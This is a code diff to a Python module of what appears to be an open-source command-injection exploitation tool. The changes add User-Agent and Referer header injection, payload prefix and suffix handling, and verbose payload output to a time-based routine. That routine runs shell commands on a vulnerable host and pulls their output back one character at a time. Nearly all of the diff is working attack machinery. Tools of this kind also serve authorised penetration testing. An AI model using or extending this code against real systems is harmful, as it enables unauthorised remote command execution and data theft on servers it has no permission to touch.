@@ -76,7 +76,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
     try:
       response = proxy.use_proxy(request)
     except urllib2.HTTPError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
       raise SystemExit() 
 
   # Check if defined Tor.
@@ -84,14 +84,14 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
     try:
       response = tor.use_tor(request)
     except urllib2.HTTPError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
       raise SystemExit() 
 
   else:
     try:
       response = urllib2.urlopen(request)
     except urllib2.HTTPError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
       raise SystemExit() 
         
   end  = time.time()
@@ -131,7 +131,7 @@ def injection_test(payload, http_request_method, url):
       try:
         response = proxy.use_proxy(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit() 
 
     # Check if defined Tor.
@@ -139,14 +139,14 @@ def injection_test(payload, http_request_method, url):
       try:
         response = tor.use_tor(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit() 
 
     else:
       try:
         response = urllib2.urlopen(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit() 
       
   # Check if defined method is POST.
@@ -172,7 +172,7 @@ def injection_test(payload, http_request_method, url):
       try:
         response = proxy.use_proxy(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit() 
 
     # Check if defined Tor.
@@ -180,14 +180,14 @@ def injection_test(payload, http_request_method, url):
       try:
         response = tor.use_tor(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit() 
 
     else:
       try:
         response = urllib2.urlopen(request)
       except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
         raise SystemExit()  
       
   end  = time.time()
@@ -228,7 +228,7 @@ def cookie_injection_test(url, vuln_parameter, payload):
       proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
       response = inject_cookie(url, vuln_parameter, payload, proxy)
     except urllib2.HTTPError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
       raise SystemExit() 
 
   # Check if defined Tor.
@@ -237,12 +237,68 @@ def cookie_injection_test(url, vuln_parameter, payload):
       proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
       response = inject_cookie(url, vuln_parameter, payload, proxy)
     except urllib2.HTTPError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
       raise SystemExit() 
 
   else:
     try:
       response = inject_cookie(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  end  = time.time()
+  how_long = int(end - start)
+
+  return how_long
+
+# --------------------------------------------------------------
+# Check if target host is vulnerable.(User-Agent-based injection)
+# --------------------------------------------------------------
+def user_agent_injection_test(url, vuln_parameter, payload):
+
+  def inject_user_agent(url, vuln_parameter, payload, proxy):
+    if proxy == None:
+      opener = urllib2.build_opener()
+    else:
+      opener = urllib2.build_opener(proxy)
+
+    request = urllib2.Request(url)
+    #Check if defined extra headers.
+    headers.do_check(request)
+    payload = urllib.unquote(payload)
+    request.add_header('User-Agent', payload)
+    response = opener.open(request)
+    return response
+
+  start = 0
+  end = 0
+  start = time.time()
+
+  proxy = None 
+  response = inject_user_agent(url, vuln_parameter, payload, proxy)
+  
+  # Check if defined any HTTP Proxy.
+  if menu.options.proxy:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  # Check if defined Tor.
+  elif menu.options.tor:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  else:
+    try:
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
     except urllib2.HTTPError, err:
       print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
       raise SystemExit() 
@@ -252,11 +308,65 @@ def cookie_injection_test(url, vuln_parameter, payload):
 
   return how_long
 
+# ------------------------------------------------------------------
+# Check if target host is vulnerable.(Referer-based injection)
+# ------------------------------------------------------------------
+def referer_injection_test(url, vuln_parameter, payload):
+
+  def inject_referer(url, vuln_parameter, payload, proxy):
+
+    if proxy == None:
+      opener = urllib2.build_opener()
+    else:
+      opener = urllib2.build_opener(proxy)
+
+    request = urllib2.Request(url)
+    #Check if defined extra headers.
+    headers.do_check(request)
+    request.add_header('Referer', urllib.unquote(payload))
+    response = opener.open(request)
+    return response
+
+  start = 0
+  end = 0
+  start = time.time()
+
+  proxy = None 
+  response = inject_referer(url, vuln_parameter, payload, proxy)
+  # Check if defined any HTTP Proxy.
+  if menu.options.proxy:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
+      response = inject_referer(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  # Check if defined Tor.
+  elif menu.options.tor:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
+      response = inject_referer(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  else:
+    try:
+      response = inject_referer(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  end  = time.time()
+  how_long = int(end - start)
+
+  return how_long
 
 # -------------------------------------------
 # The main command injection exploitation.
 # -------------------------------------------
-def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   if menu.options.file_write or menu.options.file_upload :
     minlen = 0
   else:
@@ -269,17 +379,29 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
     
     # Execute shell commands on vulnerable host.
     if alter_shell :
-      print output_length
       payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
     else:
       payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)  
 
+    # Fix prefixes / suffixes
+    payload = parameters.prefixes(payload, prefix)
+    payload = parameters.suffixes(payload, suffix)
+
     # Check if defined "--verbose" option.
     if menu.options.verbose:
-      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
-
+      sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
+   
+    # Check if defined cookie with "INJECT_HERE" tag
     if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
       how_long = cookie_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined user-agent with "INJECT_HERE" tag
+    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+      how_long = user_agent_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined referer with "INJECT_HERE" tag
+    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
+      how_long = referer_injection_test(url, vuln_parameter, payload)
 
     else:
       how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
@@ -315,13 +437,26 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
         else:
           payload = tfb_payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
 
+        # Fix prefixes / suffixes
+        payload = parameters.prefixes(payload, prefix)
+        payload = parameters.suffixes(payload, suffix)
+
         # Check if defined "--verbose" option.
         if menu.options.verbose:
-          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
-
+          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
+        
+        # Check if defined cookie with "INJECT_HERE" tag
         if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
           how_long = cookie_injection_test(url, vuln_parameter, payload)
-          
+
+        # Check if defined user-agent with "INJECT_HERE" tag
+        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+          how_long = user_agent_injection_test(url, vuln_parameter, payload)
+
+        # Check if defined referer with "INJECT_HERE" tag
+        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
+          how_long = referer_injection_test(url, vuln_parameter, payload)
+
         else:
           how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
 
@@ -329,7 +464,9 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
           if not menu.options.verbose:
             output.append(chr(ascii_char))
             percent = ((num_of_chars*100)/output_length)
-            sys.stdout.write("\r(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "', please wait... [ "+str(percent)+"% ]")
+            float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(output_length * 1.0)),2))
+            
+            sys.stdout.write("\r(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "', please wait... [ "+str(float_percent)+"% ]")
             sys.stdout.flush()
           else:
             output.append(chr(ascii_char))
@@ -352,11 +489,11 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
 # -------------------------------------
 # False Positive check and evaluation.
 # -------------------------------------
-def false_positive_check(separator, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell):
+def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell):
   
   found_chars = False
   if menu.options.verbose: 
-    sys.stdout.write("(*) Testing the reliability of used payload... ")
+    sys.stdout.write("\n(*) Testing the reliability of used payload... ")
     sys.stdout.flush()  
 
   for output_length in range(1, 3):
@@ -367,12 +504,26 @@ def false_positive_check(separator, TAG, cmd, delay, http_request_method, url, v
     else:
       payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
 
+    # Fix prefixes / suffixes
+    payload = parameters.prefixes(payload, prefix)
+    payload = parameters.suffixes(payload, suffix)
+
     # Check if defined "--verbose" option.
     if menu.options.verbose:
-      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
-
+      sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
+    
+    # Check if defined cookie with "INJECT_HERE" tag
     if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
       how_long = cookie_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined user-agent with "INJECT_HERE" tag
+    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+      how_long = user_agent_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined referer with "INJECT_HERE" tag
+    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
+      how_long = referer_injection_test(url, vuln_parameter, payload)
+
     else:
       how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
 
@@ -397,13 +548,27 @@ def false_positive_check(separator, TAG, cmd, delay, http_request_method, url, v
           payload = tfb_payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
         else:
           payload = tfb_payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method)
-          
+
+        # Fix prefixes / suffixes
+        payload = parameters.prefixes(payload, prefix)
+        payload = parameters.suffixes(payload, suffix)        
+
         # Check if defined "--verbose" option.
         if menu.options.verbose:
-          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
+          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
 
+        # Check if defined cookie with "INJECT_HERE" tag
         if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
           how_long = cookie_injection_test(url, vuln_parameter, payload)
+
+        # Check if defined user-agent with "INJECT_HERE" tag
+        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+          how_long = user_agent_injection_test(url, vuln_parameter, payload)
+
+        # Check if defined referer with "INJECT_HERE" tag
+        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
+          how_long = referer_injection_test(url, vuln_parameter, payload)
+
         else:
           how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
 
